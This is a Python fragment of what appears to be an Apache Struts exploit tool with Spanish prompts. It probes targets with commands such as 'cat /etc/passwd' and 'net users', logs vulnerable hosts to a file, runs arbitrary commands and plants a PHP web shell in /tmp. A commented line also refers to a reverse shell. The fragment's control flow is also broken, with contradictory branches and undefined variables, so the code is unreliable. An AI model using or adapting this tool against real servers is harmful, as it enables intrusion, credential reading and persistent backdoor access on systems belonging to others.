def validador():
    arr_lin_win = ["file%20/etc/passwd","dir","net%20users","id","/sbin/ifconfig","cat%20/etc/passwd"]
    if response.read().find("mamalo") != -1:
        print(RED+"   [-] VULNERABLE"+ENDC)
        owned = open('vulnsite.txt', 'a')
        owned.write(str(host)+'\n')
        owned.close()

        opcion = input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
        #print BOLD+"   * [SHELL REVERSA]"+ENDC
        #print OTRO+"     Struts@Shell:$ reverse 127.0.0.1 4444 (perl,python,bash)\n"+ENDC
        if opcion == 's':
            print(YELLOW+"   [-] GET PROMPT...\n"+ENDC)
            time.sleep(1)
            print(BOLD+"   * [UPLOAD SHELL]"+ENDC)
            print(OTRO+"     Struts@Shell:$ pwnd (php)\n"+ENDC)

        if espacio[0] != 'reverse' and espacio[0] != 'pwnd':
            shell = urllib.request.urlopen(host+exploit("'"+str(comando)+"'"))
            print("\n"+shell.read())
            if espacio[0] == 'pwnd':
                pathsave=input("path EJ:/tmp/: ")

                for shell in espacio[1]:
                    shellfile = """'python','-c','f%3dopen("/tmp/status.php","w");f.write("<?php%20system($_GET[ksujenenuhw])?>")'"""
                    urllib.request.urlopen(host+pwnd(str(shellfile)))
                    shell = urllib.request.urlopen(host+exploit("'ls','-l','"+pathsave+"status.php'"))
            tmp = not espacio[0] == 'pwnd' and espacio[0] is None
            if tmp:
                return
        else:
            print(BOLD+RED+"\nNo Create File :/\n"+ENDC)
